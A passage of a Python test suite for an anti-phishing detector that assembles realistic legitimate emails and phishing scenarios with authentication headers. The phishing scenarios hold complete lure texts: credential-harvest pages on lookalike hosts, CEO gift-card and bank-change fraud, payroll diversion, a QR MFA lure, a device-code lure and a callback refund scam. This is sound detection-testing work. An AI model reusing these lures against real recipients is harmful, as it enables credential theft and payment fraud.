"""Scenario suite: realistic MODERN e-mails with full headers, built in memory.

Public corpora cannot answer the question that matters most for a tool people
use on today's inbox: "does it stay quiet on a real Google alert / bank notice /
newsletter, and does it catch today's lures when SPF, DKIM and DMARC all pass?"
(the legitimate public corpora are from 2002 and have no authentication headers).

Every scenario is a complete RFC 5322 message modelled on how that kind of mail
really looks (sender domains, authentication results, link shapes, ESP tracking,
List-Unsubscribe ...). Nothing here is sent anywhere and no link is fetched;
attacker hosts are invented names on reserved or deliberately unregistered-looking
domains.

    from antiphish.scenarios import run_scenarios
    run_scenarios(verbose=True)

Two groups:
  DEV      used while tuning the rules
  HOLDOUT  written AFTER the rules were frozen and never tuned against -
           the number to quote
The suite is small; it complements, not replaces, feedback from real traffic.
"""
from __future__ import annotations

import io
import zipfile
from dataclasses import dataclass, field

RCPT = "amra.hodzic@firma-primjer.ba"
RCPT_SE = "erik.lindberg@exempelbolaget.se"


@dataclass
class Scenario:
    name: str
    kind: str                       # "legit" | "phish"
    raw: bytes
    group: str = "dev"              # "dev" | "holdout"
    note: str = ""
    expect: tuple = field(default=())


def _auth(from_dom: str, mode: str = "pass", signer: str | None = None, policy: str = "reject") -> str:
    """Authentication-Results as a receiving server would write it."""
    signer = signer or from_dom
    if mode == "pass":
        return (f"mx.google.com; dkim=pass header.i=@{signer} header.s=s1 header.b=abc123; "
                f"spf=pass (google.com: domain of bounce@{signer} designates 198.51.100.7 as permitted sender) "
                f"smtp.mailfrom=bounce@{signer}; dmarc=pass (p={policy.upper()} sp={policy.upper()} dis=NONE) "
                f"header.from={from_dom}")
    if mode == "fail":
        return (f"mx.google.com; dkim=none; spf=fail (google.com: domain of x@{from_dom} does not designate "
                f"203.0.113.50 as permitted sender) smtp.mailfrom=x@{from_dom}; "
                f"dmarc=fail (p={policy.upper()} dis=NONE) header.from={from_dom}")
    if mode == "unaligned":          # an ESP signed it, the From domain did not
        return (f"mx.google.com; dkim=pass header.i=@{signer} header.s=s1; spf=pass smtp.mailfrom=bounce@{signer}; "
                f"dmarc=fail (p=NONE dis=NONE) header.from={from_dom}")
    if mode == "none":
        return (f"mx.google.com; dkim=none; spf=none smtp.mailfrom=x@{from_dom}; dmarc=none header.from={from_dom}")
    if mode == "nodmarc":            # SPF+DKIM pass but the domain publishes no DMARC
        return (f"mx.google.com; dkim=pass header.i=@{signer} header.s=default; spf=pass smtp.mailfrom=x@{signer}; "
                f"dmarc=none header.from={from_dom}")
    return ""


def eml(frm: str, subject: str, text: str | None = None, html: str | None = None, to: str = RCPT,
        auth: str | None = None, reply_to: str | None = None, list_unsub: str | None = None,
        attachments: list | None = None, headers: dict | None = None, inline: list | None = None) -> bytes:
    """Assemble a raw message. attachments: [(filename, content_type, bytes)]."""
    from email.message import EmailMessage
    from email.utils import formatdate, make_msgid
    msg = EmailMessage()
    msg["From"] = frm
    msg["To"] = to
    msg["Subject"] = subject
    msg["Date"] = formatdate(1795000000, usegmt=True)
    dom = frm.rsplit("@", 1)[-1].strip(">")
    msg["Message-ID"] = make_msgid(domain=dom)
    if auth:
        msg["Authentication-Results"] = auth
    if reply_to:
        msg["Reply-To"] = reply_to
    if list_unsub:
        msg["List-Unsubscribe"] = list_unsub
        msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"
    for k, v in (headers or {}).items():
        msg[k] = v
    if text is not None:
        msg.set_content(text)
    if html is not None:
        if text is None:
            msg.set_content(html, subtype="html")
        else:
            msg.add_alternative(html, subtype="html")
    for name, ctype, data in inline or []:
        main, _, sub = ctype.partition("/")
        msg.add_attachment(data, maintype=main, subtype=sub, filename=name, disposition="inline",
                           cid=f"<{name}@img>")
    for name, ctype, data in attachments or []:
        main, _, sub = ctype.partition("/")
        if main == "text" and isinstance(data, (bytes, bytearray)):
            msg.add_attachment(data, maintype="application", subtype="octet-stream", filename=name)
        else:
            msg.add_attachment(data, maintype=main, subtype=sub, filename=name)
    return msg.as_bytes()


def _html(body: str, footer: str = "") -> str:
    return ("<!DOCTYPE html><html><head><meta charset='utf-8'><title>x</title>"
            "<style>.b{font-family:Arial}</style></head><body><table width='600'><tr><td class='b'>"
            + body + "</td></tr></table>" + footer + "</body></html>")


def _zip(files: dict) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for name, data in files.items():
            z.writestr(name, data)
    return buf.getvalue()


def _pdf(text: str) -> bytes:
    """Tiny valid one-page PDF with a text line (harmless)."""
    safe = text.replace("\\", "").replace("(", "[").replace(")", "]")
    stream = f"BT /F1 11 Tf 40 760 Td ({safe}) Tj ET".encode("latin-1", "replace")
    objs = [b"<< /Type /Catalog /Pages 2 0 R >>", b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R "
            b"/Resources << /Font << /F1 5 0 R >> >> >>",
            b"<< /Length " + str(len(stream)).encode() + b" >>\nstream\n" + stream + b"\nendstream",
            b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>"]
    out = b"%PDF-1.4\n"
    offs = []
    for i, o in enumerate(objs, 1):
        offs.append(len(out))
        out += f"{i} 0 obj\n".encode() + o + b"\nendobj\n"
    xref = len(out)
    out += f"xref\n0 {len(objs) + 1}\n0000000000 65535 f \n".encode()
    for o in offs:
        out += f"{o:010d} 00000 n \n".encode()
    out += f"trailer\n<< /Size {len(objs) + 1} /Root 1 0 R >>\nstartxref\n{xref}\n%%EOF\n".encode()
    return out


def _qr_png(payload: str) -> bytes | None:
    try:
        import cv2
        qr = cv2.QRCodeEncoder.create().encode(payload)
        qr = cv2.resize(qr, None, fx=8, fy=8, interpolation=cv2.INTER_NEAREST)
        qr = cv2.copyMakeBorder(qr, 40, 40, 40, 40, cv2.BORDER_CONSTANT, value=255)
        ok, png = cv2.imencode(".png", qr)
        return png.tobytes() if ok else None
    except Exception:
        return None


_UNSUB_FOOT = ("<p style='font-size:11px;color:#888'>You are receiving this email because you subscribed. "
               "<a href='{u}'>Unsubscribe</a> | <a href='{p}'>Privacy policy</a></p>")
FAKE_EXE = b"MZ\x90\x00" + b"\x00" * 200


def _legit_dev() -> list[Scenario]:
    S = []
    add = lambda n, raw, note="": S.append(Scenario(n, "legit", raw, "dev", note))  # noqa: E731

    add("google_security_alert", eml(
        "Google <no-reply@accounts.google.com>", "Security alert",
        html=_html("<h2>A new sign-in on Windows</h2><p>amra.hodzic@gmail.com</p><p>We noticed a new sign-in to your "
                   "Google Account on a Windows device. If this was you, you don't need to do anything. If not, "
                   "we'll help you secure your account.</p><a href='https://accounts.google.com/AccountChooser?"
                   "Email=amra.hodzic@gmail.com&continue=https://myaccount.google.com/alert/nt/1699'>Check activity</a>"
                   "<p>You can also see security activity at<br>https://myaccount.google.com/notifications</p>"),
        to="amra.hodzic@gmail.com", auth=_auth("accounts.google.com", signer="accounts.google.com")))

    add("github_pr_comment", eml(
        "maria-dev <notifications@github.com>", "Re: [acme/webshop] Fix rounding in cart totals (PR #482)",
        text="@amra-h looks good, just one nit on line 40: could we keep the Decimal here?\n\n-- \n"
             "Reply to this email directly, view it on GitHub:\nhttps://github.com/acme/webshop/pull/482#issuecomment-2211\n"
             "You are receiving this because you were mentioned.",
        auth=_auth("github.com"), reply_to="acme/webshop <reply+AAH3Q@reply.github.com>",
        list_unsub="<https://github.com/notifications/unsubscribe/AAH3Q>",
        headers={"List-ID": "acme/webshop <webshop.acme.github.com>", "Precedence": "list"}))

    add("amazon_order_confirmation_de", eml(
        "\"Amazon.de\" <bestellbestaetigung@amazon.de>", "Ihre Amazon.de Bestellung von \"Logitech MX Keys\"",
        html=_html("<p>Guten Tag Amra Hodzic,</p><p>vielen Dank für Ihre Bestellung. Wir senden Ihnen eine weitere "
                   "E-Mail, sobald Ihr Artikel versandt wurde.</p><p>Bestellnummer 302-1182334-9981123<br>"
                   "Zustellung: Donnerstag</p><a href='https://www.amazon.de/gp/css/order-details?orderID=302-1182334"
                   "&ref_=pe_27091401'>Bestelldetails ansehen</a><p>Summe: EUR 89,99</p>"),
        auth=_auth("amazon.de")))

    track = "https://footshop.us12.list-manage.com/track/click?u=4f1a9c&id={i}&e=77aa01"
    add("newsletter_mailchimp_sale", eml(
        "Footshop <news@footshop.eu>", "We have 1200 sneakers ON SALE - up to 60% off",
        html=_html("<h1>SALE: NIKE, ADIDAS, JORDAN up to 60% OFF</h1><p>Limited time offer, today only! Free shipping "
                   "over 50 EUR.</p>" + "".join(f"<a href='{track.format(i=i)}'><img src='https://mcusercontent.com/"
                                                f"4f1a9c/images/p{i}.jpg' alt='Sneaker {i}'></a>" for i in range(12))
                   + f"<p>Shop now at <a href='{track.format(i=99)}'>www.footshop.eu</a></p>",
                   _UNSUB_FOOT.format(u=track.format(i=100), p=track.format(i=101))),
        auth=_auth("footshop.eu"), list_unsub="<https://footshop.us12.list-manage.com/unsubscribe?u=4f1a9c>"))

    add("bank_statement_notice_bs", eml(
        "Raiffeisen banka <obavijesti@raiffeisenbank.ba>", "Vaš mjesečni izvod je dostupan",
        html=_html("<p>Poštovana gospođo Hodžić,</p><p>Vaš izvod za oktobar 2026. dostupan je u aplikaciji Raiffeisen "
                   "mobilno bankarstvo i u e-bankarstvu.</p><p>Iz sigurnosnih razloga banka nikada ne traži vašu "
                   "lozinku, PIN ili broj kartice putem e-maila ili telefona.</p><p>Srdačan pozdrav,<br>Raiffeisen "
                   "BANK d.d. Bosna i Hercegovina<br><a href='https://www.raiffeisenbank.ba'>www.raiffeisenbank.ba</a></p>"),
        auth=_auth("raiffeisenbank.ba")))

    add("internal_it_password_reminder", eml(
        "IT podrška <it@firma-primjer.ba>", "Podsjetnik: lozinka za domenu ističe za 7 dana",
        text="Pozdrav Amra,\n\ntvoja lozinka za Windows prijavu ističe za 7 dana. Promijeni je na svom računaru: "
             "Ctrl+Alt+Del -> Change a password.\nNe šaljemo linkove za promjenu lozinke. Ako imaš pitanja javi se "
             "na lokal 214.\n\nIT podrška", auth=_auth("firma-primjer.ba")))

    add("docusign_real_envelope", eml(
        "Marko Marković via DocuSign <dse_NA4@docusign.net>", "Complete with DocuSign: Ugovor o saradnji 2026.pdf",
        html=_html("<p>Marko Marković sent you a document to review and sign.</p><a href='https://na4.docusign.net/"
                   "Signing/EmailStart.aspx?a=7c11f0&etti=24&acct=91a'>REVIEW DOCUMENT</a><p>Marko Marković<br>"
                   "marko.markovic@partner-doo.rs</p><p>Do Not Share This Email. This email contains a secure link "
                   "to DocuSign. Please do not share this email, link, or access code with others.</p>"),
        auth=_auth("docusign.net"), reply_to="Marko Marković <marko.markovic@partner-doo.rs>"))

    add("partner_invoice_pdf_bs", eml(
        "Marko Marković <marko.markovic@partner-doo.rs>", "Faktura 2026-118 za oktobar",
        text="Poštovana Amra,\n\nu prilogu šaljem fakturu 2026-118 za usluge održavanja u oktobru. Rok plaćanja je "
             "15 dana, kao i do sada.\n\nSrdačan pozdrav,\nMarko Marković\nPartner d.o.o. Beograd\n+381 11 555 0142",
        auth=_auth("partner-doo.rs", policy="quarantine"),
        attachments=[("Faktura_2026-118.pdf", "application/pdf",
                      _pdf("Faktura 2026-118 Partner d.o.o. Usluge odrzavanja oktobar 2026 Iznos 1.240,00 EUR"))]))

    add("zoom_meeting_invite", eml(
        "Zoom <no-reply@zoom.us>", "Lejla Begić is inviting you to a scheduled Zoom meeting",
        html=_html("<p>Hi there,</p><p>Lejla Begić is inviting you to a scheduled Zoom meeting.</p><p>Topic: Weekly sync"
                   "<br>Time: Nov 26, 2026 10:00 Sarajevo</p><p>Join Zoom Meeting<br><a href='https://us02web.zoom.us/"
                   "j/84512345678?pwd=QWxx'>https://us02web.zoom.us/j/84512345678?pwd=QWxx</a></p>"
                   "<p>Meeting ID: 845 1234 5678<br>Passcode: 118822</p>"),
        auth=_auth("zoom.us")))

    add("booking_confirmation", eml(
        "Booking.com <noreply@booking.com>", "Your booking is confirmed at Hotel Europe Sarajevo",
        html=_html("<h2>Thanks, Amra! Your booking in Sarajevo is confirmed.</h2><p>Check-in Friday 27 November from "
                   "14:00<br>Check-out Sunday 29 November until 11:00</p><p>Confirmation number 4411.223.901 · PIN 8841"
                   "</p><p>You'll pay when you stay at Hotel Europe.</p><a href='https://secure.booking.com/"
                   "myreservations.html?bn=4411223901&pincode=8841'>View or change your booking</a>"),
        auth=_auth("booking.com")))

    add("postnord_tracking_sv", eml(
        "PostNord <no-reply@postnord.se>", "Ditt paket från Zalando är på väg", to=RCPT_SE,
        html=_html("<p>Hej Erik!</p><p>Ditt paket från Zalando är på väg och beräknas levereras torsdag 26 november "
                   "till ombud ICA Nära Torget.</p><p>Kollinummer: 00373500489530021456</p><a href='https://tracking."
                   "postnord.com/se/?id=00373500489530021456'>Spåra paketet</a><p>Du behöver inte göra något just nu. "
                   "Vi meddelar dig när paketet kan hämtas.</p>"),
        auth=_auth("postnord.se")))

    add("kivra_new_mail_sv", eml(
        "Kivra <noreply@kivra.com>", "Du har fått ny post från Skatteverket", to=RCPT_SE,
        html=_html("<p>Hej Erik,</p><p>Du har fått ny post från Skatteverket i din digitala brevlåda.</p>"
                   "<p>Öppna appen eller logga in på kivra.com för att läsa.</p><a href='https://app.kivra.com/'>"
                   "Öppna Kivra</a><p>Vi ber dig aldrig om lösenord eller koder via e-post.</p>"),
        auth=_auth("kivra.com")))

    li = "https://www.linkedin.com/comm/jobs/view/38{i}?trackingId=abc&refId=xyz"
    add("linkedin_job_alert", eml(
        "LinkedIn Job Alerts <jobalerts-noreply@linkedin.com>", "\"software engineer\": 12 new jobs in Sarajevo",
        html=_html("<p>Your job alert for software engineer in Sarajevo</p>" + "".join(
            f"<p><a href='{li.format(i=i)}'>Senior Engineer {i}</a><br>Company {i} · Sarajevo</p>" for i in range(6))
            + "<a href='https://www.linkedin.com/comm/jobs/search?keywords=software'>See all jobs</a>",
            _UNSUB_FOOT.format(u="https://www.linkedin.com/e/v2?e=abc&t=lun", p="https://www.linkedin.com/legal/privacy-policy")),
        auth=_auth("linkedin.com"), list_unsub="<https://www.linkedin.com/e/v2?e=abc&t=lun&midToken=AQE>"))

    add("paypal_receipt", eml(
        "\"service@paypal.com\" <service@paypal.com>", "Receipt for your payment to Spotify AB",
        html=_html("<p>Hello Amra Hodzic,</p><p>You sent a payment of 12,99 EUR to Spotify AB.</p><p>Transaction ID: "
                   "8XJ22718KD441123A<br>It may take a few minutes for this transaction to appear in your account.</p>"
                   "<a href='https://www.paypal.com/myaccount/transactions/details/8XJ22718KD441123A'>View or manage "
                   "payment</a><p>To see all the transaction details, log in to your PayPal account.</p>"
                   "<p>PayPal will never ask for your password in an email.</p>"),
        auth=_auth("paypal.com")))

    add("google_groups_list_post", eml(
        "Tarik Mujić <tarik.mujic@gmail.com>", "[sarajevo-js] Meetup u četvrtak - ko dolazi?",
        text="Ćao svima,\n\nmeetup je u četvrtak u 18h u Networks-u. Tema: Web Components u praksi. Javite ko dolazi "
             "da znamo koliko pizza naručiti.\n\nTarik\n\n-- \nYou received this message because you are subscribed "
             "to the Google Groups \"sarajevo-js\" group.\nTo unsubscribe from this group and stop receiving emails "
             "from it, send an email to sarajevo-js+unsubscribe@googlegroups.com.",
        auth=_auth("gmail.com", signer="gmail.com", policy="none"), reply_to="sarajevo-js@googlegroups.com",
        list_unsub="<mailto:googlegroups-manage+123+unsubscribe@googlegroups.com>",
        headers={"List-ID": "<sarajevo-js.googlegroups.com>", "Precedence": "list"}))

    add("zendesk_ticket_reply", eml(
        "Acme Support <support@acmesoft.zendesk.com>", "[Acme Support] Re: Ne mogu izvesti izvještaj u PDF",
        html=_html("<p>##- Please type your reply above this line -##</p><p>Pozdrav Amra,</p><p>hvala na prijavi. "
                   "Problem s izvozom u PDF riješen je u verziji 4.2.1 koju puštamo sutra. Javite ako se ponovi.</p>"
                   "<p>Lijep pozdrav,<br>Dino<br>Acme Support</p><p>Ticket #48211 · <a href='https://acmesoft.zendesk."
                   "com/hc/requests/48211'>View ticket</a></p>"),
        auth=_auth("acmesoft.zendesk.com", signer="zendesk.com", policy="none"), reply_to="Acme Support <support@acmesoft.com>"))

    add("friend_gmail_sv", eml(
        "Johan Berg <johan.berg84@gmail.com>", "Middag på lördag?", to=RCPT_SE,
        text="Hej Erik!\n\nSka vi ses på lördag kväll? Jag bokar bord på Pelikan kl 19 om det funkar för er.\n"
             "Hälsa Anna!\n\n/Johan", auth=_auth("gmail.com", policy="none")))

    add("telecom_bill_bs", eml(
        "BH Telecom <racuni@bhtelecom.ba>", "Vaš račun za oktobar 2026.",
        html=_html("<p>Poštovani korisniče,</p><p>Vaš račun za oktobar 2026. iznosi 45,60 KM. Rok plaćanja je "
                   "15.11.2026.</p><p>Račun možete platiti putem e-bankarstva, na šalterima ili u aplikaciji Moj BH "
                   "Telecom. Račun u PDF formatu nalazi se u prilogu.</p><p><a href='https://moj.bhtelecom.ba/'>Moj BH "
                   "Telecom</a></p><p>Hvala što koristite naše usluge.</p>"),
        auth=_auth("bhtelecom.ba"),
        attachments=[("Racun_2026_10.pdf", "application/pdf", _pdf("BH Telecom racun oktobar 2026 iznos 45,60 KM"))]))

    sg = "https://u2244881.ct.sendgrid.net/ls/click?upn=u001.{t}"
    add("webshop_shipping_sendgrid", eml(
        "Knjižara Buybook <narudzbe@buybook.ba>", "Vaša narudžba #BB-20411 je poslana",
        html=_html("<p>Draga Amra,</p><p>vaša narudžba #BB-20411 predana je kurirskoj službi i stiže za 1-2 radna "
                   "dana.</p><p>Broj pošiljke: 17400012233</p><a href='" + sg.format(t="x7Yq2kLmN0pQrS1tUv") + "'>Prati "
                   "pošiljku</a><p>Hvala na kupovini!<br><a href='" + sg.format(t="aB3dE5fG7hI9jK1lM") + "'>www.buybook.ba"
                   "</a></p>", _UNSUB_FOOT.format(u=sg.format(t="unsub111"), p=sg.format(t="priv222"))),
        auth=_auth("buybook.ba", policy="quarantine")))

    ics = ("BEGIN:VCALENDAR\r\nVERSION:2.0\r\nMETHOD:REQUEST\r\nBEGIN:VEVENT\r\nUID:040000008200E00074C5B7101A82E008"
           "\r\nSUMMARY:Sastanak tima - planiranje Q1\r\nDTSTART:20261126T090000Z\r\nDTEND:20261126T100000Z\r\n"
           "ORGANIZER;CN=Lejla Begic:mailto:lejla.begic@firma-primjer.ba\r\nLOCATION:Microsoft Teams Meeting\r\n"
           "DESCRIPTION:Join: https://teams.microsoft.com/l/meetup-join/19%3ameeting_NzY%40thread.v2/0\r\n"
           "END:VEVENT\r\nEND:VCALENDAR\r\n")
    add("colleague_teams_invite_ics", eml(
        "Lejla Begić <lejla.begic@firma-primjer.ba>", "Sastanak tima - planiranje Q1",
        html=_html("<p>Zdravo svima,</p><p>šaljem poziv za planiranje Q1. Dnevni red je u prilogu poziva.</p>"
                   "<p>Microsoft Teams meeting<br><a href='https://teams.microsoft.com/l/meetup-join/19%3ameeting_NzY"
                   "%40thread.v2/0?context=%7b%22Tid%22%7d'>Join the meeting now</a><br>Meeting ID: 344 112 998 21</p>"),
        auth=_auth("firma-primjer.ba"),
        attachments=[("invite.ics", "text/calendar", ics.encode())]))

    add("spotify_password_reset_requested", eml(
        "Spotify <no-reply@spotify.com>", "Reset your password",
        html=_html("<p>Hi amra.h,</p><p>We received a request to reset your Spotify password. Click the button below "
                   "to choose a new one. This link expires in 1 hour.</p><a href='https://accounts.spotify.com/en/"
                   "password-reset/complete?token=NzQ4ZmI2'>RESET PASSWORD</a><p>If you didn't request a password "
                   "reset, you can safely ignore this email.</p>"),
        auth=_auth("spotify.com")))

    add("verification_code", eml(
        "Slack <feedback@slack.com>", "Slack confirmation code: 482-913",
        html=_html("<h1>Confirm your email address</h1><p>Your confirmation code is below — enter it in your open "
                   "browser window and we'll help you get signed in.</p><h2>482-913</h2><p>If you didn't request "
                   "this email, there's nothing to worry about — you can safely ignore it.</p>"),
        auth=_auth("slack.com")))

    add("vendor_payment_reminder", eml(
        "Računovodstvo Elektro-Servis <racunovodstvo@elektroservis.ba>", "Podsjetnik: faktura 2026-0412 dospjela",
        text="Poštovani,\n\nprema našoj evidenciji faktura 2026-0412 od 01.10.2026. u iznosu od 380,00 KM još nije "
             "plaćena, a dospjela je 16.10.2026. Molimo vas da uplatu izvršite u narednih 7 dana na naš žiro račun "
             "naveden na fakturi. Ako ste u međuvremenu platili, zanemarite ovu poruku.\n\nSrdačan pozdrav,\n"
             "Računovodstvo\nElektro-Servis d.o.o. Zenica",
        auth=_auth("elektroservis.ba", policy="none"),
        attachments=[("Faktura_2026-0412.pdf", "application/pdf", _pdf("Faktura 2026-0412 Elektro-Servis 380,00 KM"))]))

    add("serbian_cyrillic_offer", eml(
        "Петар Петровић <petar.petrovic@gradnja-plus.rs>", "Понуда за радове на крову",
        text="Поштована госпођо Хоџић,\n\nу прилогу Вам шаљем понуду за радове на крову коју смо договорили прошле "
             "недеље. Понуда важи 30 дана. За сва питања стојим на располагању.\n\nСрдачан поздрав,\nПетар Петровић\n"
             "Градња Плус д.о.о.\n011 555 0177",
        auth=_auth("gradnja-plus.rs", policy="none"),
        attachments=[("Ponuda_krov.pdf", "application/pdf", _pdf("Ponuda za radove na krovu Gradnja Plus 4.800 EUR"))]))

    kl = "https://ctrk.klclick.com/l/01HXYZ{i}"
    add("black_friday_klaviyo", eml(
        "Sport Vision <newsletter@sportvision.ba>", "BLACK FRIDAY POČINJE SADA: -50% NA SVE 🔥",
        html=_html("<h1>BLACK FRIDAY -50% NA SVE</h1><p>SAMO DANAS I SUTRA! Požuri, zalihe su ograničene. Besplatna "
                   "dostava za narudžbe preko 100 KM.</p>" + "".join(
                       f"<a href='{kl.format(i=i)}'><img src='https://d3k81ch9hvuctc.cloudfront.net/company/abc/"
                       f"images/{i}.jpg' alt='NIKE AIR MAX {i}'></a>" for i in range(8))
                   + f"<p><a href='{kl.format(i=50)}'>KUPI ODMAH</a></p>",
                   _UNSUB_FOOT.format(u=kl.format(i=98), p=kl.format(i=99))),
        auth=_auth("sportvision.ba", policy="none"), list_unsub="<https://manage.kmail-lists.com/subscriptions/unsubscribe?a=abc>"))

    add("google_docs_share", eml(
        "Lejla Begić (via Google Docs) <drive-shares-dm-noreply@google.com>", "Document shared with you: \"Plan Q1 2026\"",
        html=_html("<p>Lejla Begić shared a document</p><p>Lejla Begić (lejla.begic@gmail.com) has invited you to edit "
                   "the following document:</p><p><a href='https://docs.google.com/document/d/1AbCdEfGhIjKlMnOp/edit?"
                   "usp=sharing_eil_m&ts=67'>Plan Q1 2026</a></p><a href='https://docs.google.com/document/d/"
                   "1AbCdEfGhIjKlMnOp/edit?usp=sharing_eip_m'>Open</a><p>Use is subject to the Google Privacy Policy."
                   "</p>"),
        auth=_auth("google.com"), reply_to="Lejla Begić <lejla.begic@gmail.com>"))

    add("ms365_real_quarantine_digest", eml(
        "Microsoft 365 quarantine <quarantine@messaging.microsoft.com>", "Microsoft 365 security: You have messages in quarantine",
        html=_html("<h2>Review These Messages</h2><p>3 messages are being held for you to review as of 11/22/2026.</p>"
                   "<p>Review them within 30 days of the received date by going to the Quarantine page in the "
                   "Security Center.</p><table><tr><td>Prevented spam messages</td></tr><tr><td>Sender: promo@"
                   "example-shop.biz<br>Subject: Najbolja ponuda</td></tr></table><a href='https://security.microsoft."
                   "com/quarantine?viewid=Email'>Review Message</a>"),
        auth=_auth("messaging.microsoft.com", signer="messaging.microsoft.com")))

    add("apple_receipt", eml(
        "Apple <no_reply@email.apple.com>", "Your receipt from Apple.",
        html=_html("<p>Receipt</p><p>APPLE ID amra.hodzic@icloud.com<br>DATE 22 Nov 2026<br>ORDER ID MM4X1Z9K2L</p>"
                   "<p>iCloud+ with 200 GB of Storage — Monthly — 2,99 €</p><p>If you have any questions about your "
                   "bill, please contact support. This email confirms payment for the iCloud storage plan listed "
                   "above.</p><a href='https://support.apple.com/billing'>Apple Support</a> · <a href='https://"
                   "finance-app.itunes.apple.com/account/subscriptions'>Manage subscriptions</a>"),
        to="amra.hodzic@icloud.com", auth=_auth("email.apple.com", signer="email.apple.com")))

    add("university_newsletter_plain", eml(
        "Studentska služba <studentska@etf.unsa.ba>", "Obavještenje: raspored ispita za zimski rok",
        text="Poštovani studenti,\n\nraspored ispita za zimski ispitni rok objavljen je na web stranici fakulteta: "
             "https://www.etf.unsa.ba/raspored-ispita\nPrijava ispita je otvorena do 05.01. putem studentskog "
             "informacionog sistema.\n\nStudentska služba", auth=_auth("etf.unsa.ba", policy="none")))

    add("dhl_delivery_today", eml(
        "DHL Express <noreply@dhl.com>", "DHL On Demand Delivery: your shipment arrives today",
        html=_html("<p>Dear Amra Hodzic,</p><p>Your DHL Express shipment 4455667788 from ZARA is scheduled for "
                   "delivery today between 12:00 and 16:00. A signature may be required.</p><a href='https://"
                   "delivery.dhl.com/track/4455667788'>Track or change delivery</a><p>No customs charges are due for "
                   "this shipment.</p>"),
        auth=_auth("dhl.com")))
    return S


def _phish_dev() -> list[Scenario]:
    S = []
    add = lambda n, raw, note="": S.append(Scenario(n, "phish", raw, "dev", note))  # noqa: E731

    add("m365_password_expiry_dmarc_pass", eml(
        "IT Helpdesk <notifications@it-servicedesk-portal.com>", f"Password for {RCPT} expires today",
        html=_html(f"<p>Dear {RCPT},</p><p>Your Microsoft 365 password is set to expire today. To avoid losing "
                   "access to your mailbox you can keep your current password.</p><a href='https://m365-keep-pass."
                   "pages.dev/auth?e=YW1yYQ=='>Keep Current Password</a><p>Microsoft 365 Admin Center</p>"),
        auth=_auth("it-servicedesk-portal.com", policy="none")),
        "attacker-owned domain, SPF/DKIM/DMARC all pass")

    add("docusign_impersonation_freehost", eml(
        "DocuSign <no-reply@signature-notify.net>", "You received a document to review and sign",
        html=_html("<p>You have received a document to review and sign.</p><p>Document: Payroll_Adjustment_Q4.pdf</p>"
                   "<a href='https://docu-sign-review.vercel.app/s/8841'>REVIEW DOCUMENT</a><p>This link expires in "
                   "24 hours. Do not share this email.</p>"),
        auth=_auth("signature-notify.net", mode="nodmarc")))

    add("paypal_spoof_dmarc_fail_text_mismatch", eml(
        "PayPal <service@paypal.com>", "Your account has been limited",
        html=_html("<p>Dear customer,</p><p>We noticed unusual activity and your account has been limited. Confirm "
                   "your identity within 24 hours to restore access.</p><p><a href='http://198.51.100.23/webscr/"
                   "login.php'>https://www.paypal.com/signin</a></p>"),
        auth=_auth("paypal.com", mode="fail")))

    add("bec_gift_cards_ceo_freemail", eml(
        "Emir Kovačević CEO <emir.kovacevic.ceo@gmail.com>", "Jesi li slobodna?",
        text="Amra, jesi li za stolom? Na sastanku sam i ne mogu da pričam. Treba mi jedna usluga: kupi 5 Apple "
             "gift kartica po 100 EUR za klijente, danas. Pošalji mi kodove ovdje, refundiraću ti. Neka ostane "
             "između nas dok ne objavimo.\n\nPoslano s iPhonea", auth=_auth("gmail.com", policy="none")))

    add("bec_bank_change_lookalike_reply_to", eml(
        "Marko Marković <marko.markovic@partner-doo.rs>", "RE: Faktura 2026-118 - novi podaci za uplatu",
        text="Poštovana Amra,\n\nobavještavamo vas da smo promijenili banku. Sve buduće uplate, uključujući fakturu "
             "2026-118, molimo izvršite na novi račun:\nIBAN: RS35 2650 0000 0012 3456 78\nStari račun je u reviziji "
             "i više ga ne koristimo. Molim potvrdu prijema.\n\nSrdačan pozdrav,\nMarko Marković",
        auth=_auth("partner-doo.rs", mode="fail", policy="none"),
        reply_to="Marko Marković <marko.markovic@partner-do0.rs>"))

    add("payroll_diversion_freemail", eml(
        "Lejla Begić <lejla.begic.posao@outlook.com>", "Promjena računa za platu",
        text="Zdravo,\n\npromijenila sam banku i želim da mi plata od ovog mjeseca ide na novi račun. Šta vam treba "
             "od mene da to ažurirate prije isplate? Molim da ostane povjerljivo dok ne završim sa starom bankom.\n\n"
             "Hvala,\nLejla", auth=_auth("outlook.com", policy="none")))

    qr = _qr_png("https://mfa-reenroll-portal.top/m365?u=amra")
    if qr:
        add("qr_mfa_reenrollment_inline_image", eml(
            "Microsoft Security <security@account-protection-alerts.com>", "Action required: re-enroll your MFA by Friday",
            html=_html("<p>Our records show your multi-factor authentication must be re-enrolled. Scan the code below "
                       "with your phone camera to keep access to your account.</p><img src='cid:qr@img'>"),
            auth=_auth("account-protection-alerts.com", policy="none"),
            inline=[("qr.png", "image/png", qr)]))

    add("device_code_lure", eml(
        "Teams Admin <admin@collab-notify.com>", "Finish setting up Microsoft Teams on your device",
        html=_html("<p>To keep using Teams, verify your device.</p><p>1. Open <a href='https://microsoft.com/"
                   "devicelogin'>https://microsoft.com/devicelogin</a><br>2. Enter the code <b>XQ7P-LM24</b><br>"
                   "3. Sign in with your work account</p><p>The code expires in 15 minutes.</p>"),
        auth=_auth("collab-notify.com", policy="none")))

    add("callback_norton_renewal", eml(
        "Billing Dept <billing.dept7731@gmail.com>", "Your Norton 360 subscription has been renewed - Invoice #NT-88213",
        html=_html("<h2>Norton LifeLock</h2><p>Thank you for your purchase. Your Norton 360 Deluxe subscription was "
                   "auto-renewed today.</p><p>Amount charged: $399.99<br>Payment method: card on file</p><p>If you "
                   "did not authorize this charge, call our billing desk immediately at <a href='tel:+18884231943'>"
                   "+1 (888) 423-1943</a> to cancel and request a refund.</p>"),
        auth=_auth("gmail.com", policy="none")))

    add("bs_bank_blocked_lookalike", eml(
        "Raiffeisen Bank <sigurnost@raiffeisen-ebanking.top>", "Hitno: Vaš račun je privremeno blokiran",
        html=_html("<p>Poštovani korisniče,</p><p>Zbog sumnjive aktivnosti Vaš nalog za e-bankarstvo je privremeno "
                   "blokiran. Potvrdite svoje podatke u roku od 24 sata kako biste izbjegli trajno gašenje računa.</p>"
                   "<a href='https://raiffeisen-ebanking.top/prijava'>Potvrdi podatke</a>"),
